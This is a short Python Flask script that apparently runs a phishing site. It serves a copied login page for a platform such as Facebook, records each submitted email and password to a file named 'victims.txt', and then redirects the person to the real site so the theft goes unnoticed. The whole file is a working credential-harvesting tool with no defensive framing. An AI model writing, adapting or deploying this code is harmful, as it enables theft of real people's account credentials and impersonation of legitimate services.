import sys
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')
SITE = sys.argv[1] if len(sys.argv) > 1 else "facebook"

@app.route('/')
def home():
    return render_template(f'{SITE}/index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Secure logging
    with open("victims.txt", "a") as f:
        f.write(f"[{SITE.upper()}] User: {email} | Pass: {password}\n")
    
    # Credible redirect to the real platform
    return redirect(f"https://www.{SITE}.com")

if __name__ == "__main__":
    app.run(port=5000)

